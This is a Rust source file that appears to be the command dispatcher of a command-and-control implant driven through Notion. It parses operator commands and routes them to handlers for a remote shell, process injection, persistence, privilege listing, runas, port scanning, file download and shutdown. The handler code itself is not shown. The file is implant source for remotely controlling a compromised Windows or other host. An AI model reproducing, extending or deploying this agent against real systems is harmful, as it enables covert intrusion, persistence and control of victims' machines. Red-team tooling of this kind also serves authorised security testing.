#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] extern crate winreg;
#[cfg(windows)] use std::ptr;
use serde_json::to_string as json_to_string;
use std::error::Error;
use std::result::Result;
use std::io::copy;
use std::fmt;
use std::path::Path;
use std::fs::{write, File, copy as fs_copy};
use std::env::{set_current_dir, current_dir, var, args};
use std::process::Command;
use reqwest::{Client};

use crate::config::ConfigOptions;


pub mod cd;
pub mod download;
pub mod getprivs;
pub mod inject;
// pub mod is_elevated;
pub mod persist;
pub mod portscan;
pub mod ps;
pub mod pwd;
pub mod runas;
pub mod save;
pub mod shell;
pub mod shutdown;
pub mod unknown;

pub enum CommandType {
    Cd(String),
    Download(String),
    Getprivs,
    Inject(String),
    Portscan(String),
    Persist(String),
    Ps,
    Pwd,
    Save(String),
    Runas(String),
    Shell(String),
    Shutdown,
    Unknown(String)
}

#[derive(Debug)]
pub struct CommandError(String);

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl Error for CommandError {}

/// Handler for a NotionCommand
// pub trait CommandHandler {
//     fn handle(s: S)
// }

pub struct NotionCommand {
    pub command_type: CommandType,
}

impl NotionCommand {
    pub fn from_string(command_str: String) -> Result<NotionCommand, CommandError> {
        let mut command_words = command_str.split(" ");
        // Taking the first command advances the iterator, so the remaining 
        // items should be the command data.
        // The call to this function clears the target emoji
        // TODO: Maybe do that here?
        if let Some(t) = command_words.nth(0) {
            let command_string = String::from(
                command_words.collect::<Vec<&str>>()
                .as_slice()
                .join::<&str>(" ")
            );
            let command_type: CommandType = match t {
                "cd"       => CommandType::Cd(command_string),
                "download" => CommandType::Download(command_string),
                "getprivs" => CommandType::Getprivs,
                "inject"   => CommandType::Inject(command_string),
                "persist"  => CommandType::Persist(command_string),
                "portscan" => CommandType::Portscan(command_string),
                "ps"       => CommandType::Ps,
                "pwd"      => CommandType::Pwd,
                "runas"    => CommandType::Runas(command_string),
                "save"     => CommandType::Save(command_string),
                "shell"    => CommandType::Shell(command_string),
                "shutdown" => CommandType::Shutdown,
                _          => CommandType::Unknown(command_string)
            };
            return Ok(NotionCommand { command_type: command_type});

        } else {
            Err(CommandError("Could not parse command!".to_string()))
        }
    }
    pub async fn handle(&self, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
        match &self.command_type {
            CommandType::Cd(s)       => cd::handle(&s),
            CommandType::Download(s) => download::handle(&s).await,
            CommandType::Getprivs    => getprivs::handle().await,
            CommandType::Inject(s)   => inject::handle(&s).await,
            CommandType::Persist(s)  => persist::handle(&s).await,
            CommandType::Portscan(s) => portscan::handle(&s).await,
            CommandType::Ps          => ps::handle().await,
            CommandType::Pwd         => pwd::handle().await,
            CommandType::Runas(s)    => runas::handle(&s).await,
            CommandType::Save(s)     => save::handle(&s, config_options).await,
            CommandType::Shell(s)    => shell::handle(&s).await,
            CommandType::Shutdown    => shutdown::handle().await,
            CommandType::Unknown(_)  => unknown::handle().await
        }
    }
}